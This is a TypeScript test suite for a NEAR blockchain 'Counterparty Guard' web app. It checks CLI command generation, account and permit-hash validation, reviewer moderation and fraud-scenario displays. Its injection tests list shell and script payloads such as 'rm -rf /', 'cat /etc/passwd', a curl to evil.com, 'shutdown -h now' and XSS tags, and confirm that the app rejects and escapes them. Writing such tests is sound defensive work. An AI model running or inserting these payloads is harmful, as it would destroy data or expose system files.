import type { ScenarioId } from '@counterparty-guard/shared';
import React from 'react';
import { renderToString } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Header } from '../src/components/Header';
import {
  SCENARIO_RECEIVER_EVIDENCE,
  generateCustomReceiverEvidence,
  getReceiverEvidence,
  getScenarioEvidence,
} from '../src/data/mockReceiverEvidence';
import type { Network, PendingWarningContext, ReportItem } from '../src/types';
import { CheckActionView } from '../src/views/CheckActionView';
import { EvidenceTimeline } from '../src/views/EvidenceTimeline';
import { type BlocklistRevisionItem, ReviewerPortal } from '../src/views/ReviewerPortal';
import {
  WarningApproval,
  isValidNearAccountId,
  validatePermitHash,
} from '../src/views/WarningApproval';

describe('Challenger M5 Adversarial Stress & Verification Suite (apps/web)', () => {
  // =========================================================================
  // 1. STRESS TESTING WarningApproval.tsx
  // =========================================================================
  describe('Dimension 1: WarningApproval — Exact NEAR CLI Syntax & Escaping', () => {
    const validPermitHash = '9b8e21a0f54318c39e2d765418b7654321908765432109876543210987654321';

    it('generates the exact NEAR CLI syntax required by specification across networks', () => {
      const networks: Network[] = ['testnet', 'mainnet', 'sandbox'];

      for (const net of networks) {
        const html = renderToString(
          <WarningApproval
            initialNetwork={net}
            initialOwnerAccount="owner.testnet"
            context={{
              permitHash: validPermitHash,
              vaultAccountId: 'vault.agent-c.testnet',
              receiverAccountId: 'new-vendor.testnet',
              amountNear: '0.05',
              reasonCodes: ['RECENT_DEPLOYMENT'],
            }}
          />,
        );

        // Required CLI command format:
        // near contract call-function as-transaction <vault_account> approve_warn json-args '{"permit_hash":"<hash>"}' prepaid-gas '100.0 Tgas' attached-deposit '0 NEAR' sign-as <owner_account> network-config <network>
        expect(html).toContain(
          'near contract call-function as-transaction vault.agent-c.testnet approve_warn',
        );
        expect(html).toContain(
          `json-args &#x27;{&quot;permit_hash&quot;:&quot;${validPermitHash}&quot;}&#x27;`,
        );
        expect(html).toContain('prepaid-gas &#x27;100.0 Tgas&#x27;');
        expect(html).toContain('attached-deposit &#x27;0 NEAR&#x27;');
        expect(html).toContain('sign-as owner.testnet');
        expect(html).toContain(`network-config ${net}`);
      }
    });

    it('neutralizes shell injection and special characters in account names and reasons', () => {
      const injectionPayloads = [
        'vault; rm -rf /',
        'vault$(whoami)',
        'vault`id`',
        "vault' OR '1'='1",
        'vault && cat /etc/passwd',
        'vault|curl http://evil.com',
        'vault\nreboot',
        'vault\0bad',
        '<script>alert("XSS")</script>',
        '"><img src=x onerror=alert(1)>',
      ];

      for (const payload of injectionPayloads) {
        // Validation check
        expect(isValidNearAccountId(payload)).toBe(false);

        const html = renderToString(
          <WarningApproval
            context={{
              permitHash: validPermitHash,
              vaultAccountId: payload,
              receiverAccountId: 'new-vendor.testnet',
              amountNear: '0.05',
              reasonCodes: [payload],
            }}
          />,
        );

        // Must display validation error
        expect(html).toContain('Invalid NEAR account format');
        expect(html).toContain('Validation Error');

        // Copy button must be disabled
        expect(html).toContain('disabled=""');

        // No unescaped executable script or img tags
        expect(html).not.toContain('<script>');
        expect(html).not.toContain('<img src=x');
      }
    });

    it('neutralizes adversarial payloads in owner account', () => {
      const badOwners = [
        'owner; shutdown -h now',
        'owner$(rm -rf .)',
        'owner\nevil.near',
        'bad@owner.near',
        'owner testnet',
      ];

      for (const badOwner of badOwners) {
        expect(isValidNearAccountId(badOwner)).toBe(false);

        const html = renderToString(
          <WarningApproval
            initialOwnerAccount={badOwner}
            context={{
              permitHash: validPermitHash,
              vaultAccountId: 'vault.testnet',
              receiverAccountId: 'new-vendor.testnet',
              amountNear: '0.05',
              reasonCodes: ['RECENT_DEPLOYMENT'],
            }}
          />,
        );

        expect(html).toContain('Invalid NEAR owner account');
        expect(html).toContain('Validation Error');
        expect(html).toContain('disabled=""');
      }
    });

    it('handles comprehensive boundary cases in validatePermitHash', () => {
      // Valid canonical 64 hex
      const validCanonical = 'a'.repeat(64);
      expect(validatePermitHash(validCanonical)).toEqual({
        isValid: true,
        canonicalHash: validCanonical,
        displayHash: `0x${validCanonical}`,
      });

      // Valid 0x prefix (should be normalized)
      expect(validatePermitHash(`0x${validCanonical}`)).toEqual({
        isValid: true,
        canonicalHash: validCanonical,
        displayHash: `0x${validCanonical}`,
      });

      // Valid 0X uppercase prefix
      expect(validatePermitHash(`0X${validCanonical}`)).toEqual({
        isValid: true,
        canonicalHash: validCanonical,
        displayHash: `0x${validCanonical}`,
      });

      // Valid uppercase hex (normalized to lowercase)
      const uppercaseHex = 'A'.repeat(64);
      expect(validatePermitHash(uppercaseHex)).toEqual({
        isValid: true,
        canonicalHash: validCanonical,
        displayHash: `0x${validCanonical}`,
      });

      // Leading/trailing whitespace trimmed
      expect(validatePermitHash(`  ${validCanonical}  `)).toEqual({
        isValid: true,
        canonicalHash: validCanonical,
        displayHash: `0x${validCanonical}`,
      });

      // Invalid empty/whitespace
      expect(validatePermitHash('').isValid).toBe(false);
      expect(validatePermitHash('   ').isValid).toBe(false);

      // Invalid off-by-one lengths
      expect(validatePermitHash('a'.repeat(63)).isValid).toBe(false);
      expect(validatePermitHash('a'.repeat(65)).isValid).toBe(false);
      expect(validatePermitHash(`0x${'a'.repeat(63)}`).isValid).toBe(false);
      expect(validatePermitHash(`0x${'a'.repeat(65)}`).isValid).toBe(false);

      // Invalid non-hex characters
      expect(validatePermitHash('g'.repeat(64)).isValid).toBe(false);
      expect(validatePermitHash(`${'a'.repeat(60)}wxyz`).isValid).toBe(false);
      expect(validatePermitHash(`${'a'.repeat(30)};rm -rf${'a'.repeat(26)}`).isValid).toBe(false);
      expect(validatePermitHash(`0x0x${'a'.repeat(60)}`).isValid).toBe(false);
    });

    it('replaces permit hash with <invalid_permit_hash> and disables copy button on invalid hash', () => {
      const invalidHashes = ['short_hash', '0x123', 'g'.repeat(64), '   '];

      for (const inv of invalidHashes) {
        const html = renderToString(
          <WarningApproval
            context={{
              permitHash: inv,
              vaultAccountId: 'vault.testnet',
              receiverAccountId: 'vendor.testnet',
              amountNear: '0.05',
              reasonCodes: ['RECENT_DEPLOYMENT'],
            }}
          />,
        );

        expect(html).toContain('Validation Error');
        expect(html).toContain('&lt;invalid_permit_hash&gt;');
        expect(html).toContain('disabled=""');
      }
    });

    it('falls back to default permit hash if empty string is supplied via context', () => {
      const html = renderToString(
        <WarningApproval
          context={{
            permitHash: '',
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'vendor.testnet',
            amountNear: '0.05',
            reasonCodes: ['RECENT_DEPLOYMENT'],
          }}
        />,
      );

      // Falls back to default permit hash via logical OR (context?.permitHash || defaultPermitHash)
      expect(html).toContain('Parameters Validated');
      expect(html).toContain('9b8e21a0f54318c39e2d765418b7654321908765432109876543210987654321');
    });

    it('strictly tests NEAR account ID boundary cases in isValidNearAccountId', () => {
      // Valid cases
      expect(isValidNearAccountId('ab')).toBe(true); // min length 2
      expect(isValidNearAccountId('a'.repeat(64))).toBe(true); // 64 hex implicit account
      expect(
        isValidNearAccountId('1234567890123456789012345678901234567890123456789012345678901234'),
      ).toBe(true);
      expect(isValidNearAccountId('alice.near')).toBe(true);
      expect(isValidNearAccountId('vault.agent-c.testnet')).toBe(true);
      expect(isValidNearAccountId('a.b.c.d.e.testnet')).toBe(true);
      expect(isValidNearAccountId('alpha_beta-gamma.near')).toBe(true);

      // Invalid cases
      expect(isValidNearAccountId('')).toBe(false);
      expect(isValidNearAccountId('a')).toBe(false); // length 1 < 2
      expect(isValidNearAccountId('a'.repeat(65))).toBe(false); // length 65 > 64
      expect(isValidNearAccountId('Alice.near')).toBe(false); // uppercase
      expect(isValidNearAccountId('alice.NEAR')).toBe(false); // uppercase
      expect(isValidNearAccountId('.alice.near')).toBe(false); // leading dot
      expect(isValidNearAccountId('alice.near.')).toBe(false); // trailing dot
      expect(isValidNearAccountId('-alice.near')).toBe(false); // leading hyphen
      expect(isValidNearAccountId('alice.near-')).toBe(false); // trailing hyphen
      expect(isValidNearAccountId('_alice.near')).toBe(false); // leading underscore
      expect(isValidNearAccountId('alice.near_')).toBe(false); // trailing underscore
      expect(isValidNearAccountId('alice..near')).toBe(false); // double dot
      expect(isValidNearAccountId('alice--near')).toBe(false); // double hyphen
      expect(isValidNearAccountId('alice__near')).toBe(false); // double underscore
      expect(isValidNearAccountId('alice.-near')).toBe(false); // dot-hyphen
      expect(isValidNearAccountId('alice/near')).toBe(false); // slash
      expect(isValidNearAccountId('alice near')).toBe(false); // space
      expect(isValidNearAccountId('alice\nnear')).toBe(false); // newline
    });

    it('safely handles extreme NEAR amounts in WarningApproval', () => {
      // 0 NEAR
      const html0 = renderToString(
        <WarningApproval
          context={{
            permitHash: validPermitHash,
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'vendor.testnet',
            amountNear: '0',
            reasonCodes: ['RECENT_DEPLOYMENT'],
          }}
        />,
      );
      expect(html0).toContain('0 yoctoNEAR');

      // Invalid amount: falls back gracefully to '0 yoctoNEAR' without throwing
      const htmlInvalid = renderToString(
        <WarningApproval
          context={{
            permitHash: validPermitHash,
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'vendor.testnet',
            amountNear: 'invalid_amount',
            reasonCodes: ['RECENT_DEPLOYMENT'],
          }}
        />,
      );
      expect(htmlInvalid).toContain('0 yoctoNEAR');
    });
  });

  // =========================================================================
  // 2. STRESS TESTING ReviewerPortal.tsx
  // =========================================================================
  describe('Dimension 2: ReviewerPortal — Auth Toggle, Reason Validation & Filtering', () => {
    it('strictly enforces reviewer vs agent auth session modes', () => {
      // Reviewer mode
      const htmlReviewer = renderToString(
        <ReviewerPortal initialSessionMode="authenticated_reviewer" />,
      );
      expect(htmlReviewer).toContain('Authenticated Session:');
      expect(htmlReviewer).toContain('moderator.testnet');
      expect(htmlReviewer).toContain('Security Officer / Reviewer Authority');
      expect(htmlReviewer).toContain('✓ Reviewer Authenticated');
      expect(htmlReviewer).toContain('Commit Moderation Record (Increment Revision)');
      expect(htmlReviewer).not.toContain('disabled=""');

      // Agent mode
      const htmlAgent = renderToString(
        <ReviewerPortal initialSessionMode="unauthenticated_agent" />,
      );
      expect(htmlAgent).toContain(
        'Autonomous Agent Session: agent.testnet (Intake Only — No Review Authority)',
      );
      expect(htmlAgent).toContain('✕ Unauthenticated Agent (403)');
      expect(htmlAgent).toContain('403 Forbidden (Reviewer Auth Required)');
      expect(htmlAgent).toContain('disabled=""');
    });

    it('validates all queue filtering states (all, submitted, references_verified, corroborated)', () => {
      const customReports: ReportItem[] = [
        {
          id: 'rep_sub',
          accusedAccountId: 'target-sub.testnet',
          reporterId: 'rep1.testnet',
          category: 'phishing',
          description: 'Submitted allegation pending review.',
          status: 'submitted',
          evidenceHashes: ['a'.repeat(64)],
          txReferences: [],
          issuedAt: Date.now() - 1000,
        },
        {
          id: 'rep_ver',
          accusedAccountId: 'target-ver.testnet',
          reporterId: 'rep2.testnet',
          category: 'drainer',
          description: 'References verified allegation.',
          status: 'references_verified',
          evidenceHashes: ['b'.repeat(64)],
          txReferences: ['tx1'],
          issuedAt: Date.now() - 2000,
        },
        {
          id: 'rep_cor',
          accusedAccountId: 'target-cor.testnet',
          reporterId: 'rep3.testnet',
          category: 'malicious_contract',
          description: 'Corroborated allegation.',
          status: 'corroborated',
          evidenceHashes: ['c'.repeat(64)],
          txReferences: ['tx2'],
          issuedAt: Date.now() - 3000,
        },
      ];

      const html = renderToString(<ReviewerPortal initialReports={customReports} />);

      // Queue renders all reports by default
      expect(html).toContain('target-sub.testnet');
      expect(html).toContain('target-ver.testnet');
      expect(html).toContain('target-cor.testnet');
      expect(html).toContain('submitted');
      expect(html).toContain('references_verified');
      expect(html).toContain('corroborated');
    });

    it('renders empty queue fallback when initialReports is empty', () => {
      const html = renderToString(<ReviewerPortal initialReports={[]} />);
      expect(html).toContain('No reports matching filter');
      expect(html).toContain('None selected');
    });

    it('renders append-only blocklist revision log with custom revisions and scopes', () => {
      const customRevisions: BlocklistRevisionItem[] = [
        {
          revisionNumber: 10,
          entryId: 'blk_010',
          action: 'added',
          network: 'testnet',
          accusedAccountId: 'target-both.testnet',
          contractCodeHash: '7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e',
          scope: 'both',
          reviewerId: 'chief-officer.testnet',
          reason: 'Verified drain vector across contract bytecode and target account.',
          createdAt: Date.now(),
        },
        {
          revisionNumber: 9,
          entryId: 'blk_009',
          action: 'revoked',
          network: 'testnet',
          accusedAccountId: 'cleared-account.testnet',
          scope: 'account',
          reviewerId: 'appeals.testnet',
          reason: 'Vendor verified invoice signature authenticity.',
          createdAt: Date.now() - 3600000,
        },
      ];

      const html = renderToString(<ReviewerPortal initialRevisions={customRevisions} />);

      expect(html).toContain('Blocklist Revision: #10');
      expect(html).toContain('Total Revisions: 2');
      expect(html).toContain('#10');
      expect(html).toContain('#9');
      expect(html).toContain('target-both.testnet');
      expect(html).toContain('cleared-account.testnet');
      expect(html).toContain(
        'code:7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e',
      );
      expect(html).toContain('ADDED');
      expect(html).toContain('REVOKED');
      expect(html).toContain('both');
      expect(html).toContain('account');
      expect(html).toContain('chief-officer.testnet');
      expect(html).toContain('appeals.testnet');
    });

    it('prominently displays the invariant that unreviewed reports cannot block', () => {
      const html = renderToString(<ReviewerPortal />);
      expect(html).toContain('Security Invariant: Raw Unreviewed Reports Cannot Block');
      expect(html).toContain(
        'Unreviewed report intake swarms (regardless of volume, e.g. coordinated Sybil floods)',
      );
      expect(html).toContain('WARN');
      expect(html).toContain(
        'Only an explicit, authenticated human reviewer action (active_block)',
      );
    });
  });

  // =========================================================================
  // 3. STRESS TESTING EvidenceTimeline.tsx (S1–S10 Scenarios)
  // =========================================================================
  describe('Dimension 3: EvidenceTimeline — S1–S10 Scenarios & Heuristics', () => {
    const allScenarios: ScenarioId[] = [
      'S1',
      'S2',
      'S3',
      'S4',
      'S5',
      'S6',
      'S7',
      'S8',
      'S9',
      'S10',
    ];

    it('renders all canonical scenarios S1 through S10 without crashing in SSR', () => {
      for (const scenId of allScenarios) {
        const html = renderToString(<EvidenceTimeline initialScenarioId={scenId} />);
        const cleanHtml = html.replace(/<!-- -->/g, '');
        expect(cleanHtml).toContain('Receiver Evidence Timeline &amp; Graph Panel');
        expect(cleanHtml).toContain('Inspect Target');
        expect(cleanHtml).toContain(`${scenId} Preset`);

        const data = getScenarioEvidence(scenId);
        expect(cleanHtml).toContain(data.accountId);
        expect(cleanHtml).toContain(data.decision.toUpperCase());
      }
    });

    it('verifies S7 Bytecode Diffing: renders previous vs current code hashes and diff metrics', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S7" />);

      // S7 Header & Decision
      expect(html).toContain('contract.testnet');
      expect(html).toContain('WARN');

      // Bytecode Upgrade Indicator
      expect(html).toContain('CODE_CHANGED: BYTECODE UPGRADED');
      expect(html).toContain('Contract Bytecode Upgrade Detected (Policy Trigger: S7)');

      // Previous & Current Code Hashes
      expect(html).toContain('3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b');
      expect(html).toContain('7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e');
      expect(html).toContain('v1.0.0');
      expect(html).toContain('v2.0.0');
      expect(html).toContain('48.2 KB, +15.8 KB');

      // Events
      expect(html).toContain('Contract Bytecode Upgraded to v2.0.0 (CODE_CHANGED)');
    });

    it('verifies S5 Circular Activity: renders circular flow detection card, ring accounts and cycle path', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S5" />);

      // S5 Header & Decision
      expect(html).toContain('wash-trader.testnet');
      expect(html).toContain('WARN');

      // Circular Flow Detection Panel
      expect(html).toContain('Circular Flow Detection (CIRCULAR_ACTIVITY)');
      expect(html).toContain('Score: 65/100');
      expect(html).toContain('85%');
      expect(html).toContain('Reciprocal money flows detected in closed 3-account ring');

      // Cycle Paths and Ring Accounts
      expect(html).toContain(
        'wash-trader.testnet → ring-a.testnet → ring-b.testnet → wash-trader.testnet',
      );
      expect(html).toContain('ring-a.testnet');
      expect(html).toContain('ring-b.testnet');

      // Funding Lineage Hops
      expect(html).toContain('Hop 1');
      expect(html).toContain('Cycle Hop 1: wash-trader -&gt; ring-a');
      expect(html).toContain('Cycle Hop 3: ring-b -&gt; wash-trader (Loop Closed)');
    });

    it('verifies S4 Sybil Discount: renders Sybil clustering panel with 1.0 capped weight', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S4" />);

      // S4 Header & Decision
      expect(html).toContain('popular-service.testnet');
      expect(html).toContain('ALLOW'); // Decision is ALLOW despite 20 reports!

      // Sybil Clustering Panel
      expect(html).toContain('Sybil Clustering &amp; Weight Capping');
      expect(html).toContain('Capped: 1.0 Max');
      expect(html).toContain('sybil-parent.testnet');
      expect(html).toContain('20 accounts');
      expect(html).toContain('1.0 (0.05 per report)');
      expect(html).toContain(
        'Coordinated Sybil floods cannot trigger a hard block without authenticated human reviewer action',
      );

      // Reports summary
      expect(html).toContain('20 total allegation(s) on file');
      expect(html).toContain('1.0 (Capped)');
    });

    it('verifies S6 Common Faucet Exemption: renders Faucet Exemption Active banner', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S6" />);

      // S6 Header & Decision
      expect(html).toContain('user-b.testnet');
      expect(html).toContain('ALLOW');

      // Faucet Exemption Control Card
      expect(html).toContain('Common Faucet Exemption Active');
      expect(html).toContain('faucet.testnet');
      expect(html).toContain(
        'Funding edges connected to faucet.testnet are exempted from clustering',
      );
      expect(html).toContain('Legitimate shared testnet infrastructure is never penalized');
    });

    it('verifies S3 Active Block: renders critical hard block banner and reviewed report', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S3" />);

      expect(html).toContain('known-drainer.testnet');
      expect(html).toContain('BLOCK');
      expect(html).toContain('ACTIVE HARD BLOCK IN EFFECT (Blocklist Revision #7)');
      expect(html).toContain('CVE-2026-NEAR-01');
      expect(html).toContain(
        'Guard SDK aborts all execution attempts before signing (signed=false, submitted=false)',
      );
      expect(html).toContain('victim-dao.testnet');
      expect(html).toContain('Drained 150 NEAR via unauthorized transfer');
    });

    it('verifies S1 Legitimate Established Receiver: clean history and baseline transfer', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S1" />);

      expect(html).toContain('merchant.testnet');
      expect(html).toContain('ALLOW');
      expect(html).toContain('182 Days');
      expect(html).toContain('42 Finalized');
      expect(html).toContain('Clean Report Audit Trail');
    });

    it('verifies S8 Policy Limit Exceeded & S9 Provider Outage (Fail-Closed)', () => {
      // S8
      const htmlS8 = renderToString(<EvidenceTimeline initialScenarioId="S8" />);
      expect(htmlS8).toContain('merchant.testnet');
      expect(htmlS8).toContain('ERROR');
      expect(htmlS8).toContain('Permit Replay Rejected On-Chain');

      // S9
      const htmlS9 = renderToString(<EvidenceTimeline initialScenarioId="S9" />);
      expect(htmlS9).toContain('unknown-target.testnet');
      expect(htmlS9).toContain('ERROR');
      expect(htmlS9).toContain('Provider Timeout (Fail-Closed)');
      expect(htmlS9).toContain('Truncated: TRUE');
    });

    it('verifies S10 Supported Method Call: allowlisted fixture contract', () => {
      const html = renderToString(<EvidenceTimeline initialScenarioId="S10" />);
      expect(html).toContain('fixture.testnet');
      expect(html).toContain('ALLOW');
      expect(html).toContain('Allowlisted Bytecode Deployed');
    });

    it('evaluates dynamic custom target generation with various heuristic keywords', () => {
      // Malicious target
      const drainEvidence = generateCustomReceiverEvidence('adversary-drainer.testnet');
      expect(drainEvidence.decision).toBe('block');
      expect(drainEvidence.isBlocked).toBe(true);
      expect(drainEvidence.riskScore).toBe(100);

      // Upgraded contract target
      const upgradeEvidence = generateCustomReceiverEvidence('upgraded-vault.testnet');
      expect(upgradeEvidence.decision).toBe('warn');
      expect(upgradeEvidence.historical.codeHashChanged).toBe(true);
      expect(upgradeEvidence.riskScore).toBe(55);

      // Circular wash target
      const washEvidence = generateCustomReceiverEvidence('wash-ring.testnet');
      expect(washEvidence.decision).toBe('warn');
      expect(washEvidence.circularFlow.detected).toBe(true);
      expect(washEvidence.riskScore).toBe(65);

      // Faucet funded target
      const faucetEvidence = generateCustomReceiverEvidence('faucet-user.testnet');
      expect(faucetEvidence.decision).toBe('allow');
      expect(faucetEvidence.faucetExemption.isExempted).toBe(true);

      // Render custom in EvidenceTimeline
      const htmlCustom = renderToString(
        <EvidenceTimeline initialTargetAccountId="adversary-drainer.testnet" />,
      );
      expect(htmlCustom).toContain('adversary-drainer.testnet');
      expect(htmlCustom).toContain('BLOCK');
      expect(htmlCustom).toContain('ACTIVE HARD BLOCK IN EFFECT');
    });
  });

  // =========================================================================
  // 4. UI INVARIANTS, INTEGRATION & ERROR ROBUSTNESS
  // =========================================================================
  describe('Dimension 4: UI Invariants, Reason Codes & App Shell Integration', () => {
    it('properly formats and joins multiple reason codes in WarningApproval', () => {
      const htmlMultiple = renderToString(
        <WarningApproval
          context={{
            permitHash: '7a8b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'new-vendor.testnet',
            amountNear: '0.05',
            reasonCodes: ['CODE_CHANGED', 'RECENT_DEPLOYMENT', 'UNKNOWN_AGE'],
          }}
        />,
      );

      expect(htmlMultiple).toContain('CODE_CHANGED, RECENT_DEPLOYMENT, UNKNOWN_AGE');

      // Empty reason codes fallback
      const htmlDefault = renderToString(
        <WarningApproval
          context={{
            permitHash: '7a8b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'new-vendor.testnet',
            amountNear: '0.05',
            reasonCodes: [],
          }}
        />,
      );

      expect(htmlDefault).toContain('RECENT_DEPLOYMENT (Account created &lt; 24h ago)');
    });

    it('verifies exact yoctoNEAR conversion for 1 yocto (smallest unit) and large values', () => {
      // 1 yoctoNEAR
      const html1Yocto = renderToString(
        <WarningApproval
          context={{
            permitHash: '7a8b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'vendor.testnet',
            amountNear: '0.000000000000000000000001',
            reasonCodes: ['RECENT_DEPLOYMENT'],
          }}
        />,
      );

      expect(html1Yocto).toContain('1 yoctoNEAR');

      // 50.0 NEAR
      const html50Near = renderToString(
        <WarningApproval
          context={{
            permitHash: '7a8b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
            vaultAccountId: 'vault.testnet',
            receiverAccountId: 'vendor.testnet',
            amountNear: '50.0',
            reasonCodes: ['RECENT_DEPLOYMENT'],
          }}
        />,
      );

      expect(html50Near).toContain('50000000000000000000000000 yoctoNEAR');
    });

    it('validates ReviewerPortal decision and scope selection options in form', () => {
      const html = renderToString(<ReviewerPortal />);

      // Decision options
      expect(html).toContain('value="active_block"');
      expect(html).toContain('Activate Hard Block (active_block)');
      expect(html).toContain('value="corroborated"');
      expect(html).toContain('Confirm Corroboration (corroborated)');
      expect(html).toContain('value="dismissed"');
      expect(html).toContain('Dismiss Allegation (dismissed)');

      // Scope options
      expect(html).toContain('value="account"');
      expect(html).toContain('Account Only');
      expect(html).toContain('value="code_hash"');
      expect(html).toContain('Contract Bytecode Hash Only');
      expect(html).toContain('value="both"');
      expect(html).toContain('Both Account &amp; Bytecode');
    });

    it('renders Header navigation tabs and all 4 view shells without error', () => {
      const htmlHeader = renderToString(
        <Header
          activeTab="checks"
          setActiveTab={() => {}}
          network="testnet"
          setNetwork={() => {}}
        />,
      );

      expect(htmlHeader).toContain('Counterparty Guard');
      expect(htmlHeader).toContain('Check Action');
      expect(htmlHeader).toContain('Evidence Timeline');
      expect(htmlHeader).toContain('Warning Approvals');
      expect(htmlHeader).toContain('Reviewer Portal');

      // Verify all 4 views can render independently
      const htmlChecks = renderToString(<CheckActionView />);
      const htmlEvidence = renderToString(<EvidenceTimeline />);
      const htmlApprovals = renderToString(<WarningApproval />);
      const htmlModeration = renderToString(<ReviewerPortal />);

      expect(htmlChecks).toContain('Proposed Transaction Action');
      expect(htmlEvidence).toContain('Receiver Evidence Timeline');
      expect(htmlApprovals).toContain('Owner Warning Approval Required');
      expect(htmlModeration).toContain('Reviewer Moderation Portal');
    });
  });
});
